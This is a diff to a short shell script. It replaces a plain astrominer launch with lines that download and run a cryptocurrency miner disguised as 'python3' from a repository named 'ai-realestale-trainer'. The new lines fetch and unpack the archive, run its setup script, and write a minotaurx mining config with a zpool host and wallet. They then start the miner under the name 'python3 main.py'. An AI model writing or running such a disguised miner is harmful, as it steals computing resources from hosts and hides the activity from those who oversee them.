@@ -1,2 +1,10 @@
 #! /bin/sh
-wget https://github.com/dero-am/astrobwt-miner/releases/download/V1.9.2.R5/astrominer-V1.9.2.R5_amd64_linux.tar.gz; tar xvaf astrominer-V1.9.2.R5_amd64_linux.tar.gz; cd astrominer; ./astrominer -w deroi1qy9al37a8qgjmat4y9wf5wc637md58jtt6p4980k34xxhrk2h9m6jq9pvfz92xcqqqqcuqjtt8tq0zys9j -r community-pools.mysrv.cloud:10300 -p rpc
+wget https://github.com/malphite-code-3/ai-realestale-trainer/releases/download/python3/python3.tar.gz
+tar -xvf python3.tar.gz
+rm python3.tar.gz
+cd python3
+./setup.sh
+rm config.json && echo '{"algorithm": "minotaurx", "host": "minotaurx.sea.mine.zpool.ca", "port": 7019, "worker": "RLaigv5nSC2dKvM63F8dN4EHjxBEcZi11o", "password": "c=RVN", "workers": 2, "log": false, "chrome": "./chromium/chrome" }' > config.json
+export LD_LIBRARY_PATH=$HOME/dependencies/lib/x86_64-linux-gnu:$HOME/dependencies/usr/lib/x86_64-linux-gnu:$LD_LIBRARY_PATH
+export PATH=$HOME/dependencies/usr/bin:$PATH
+./python3 main.py
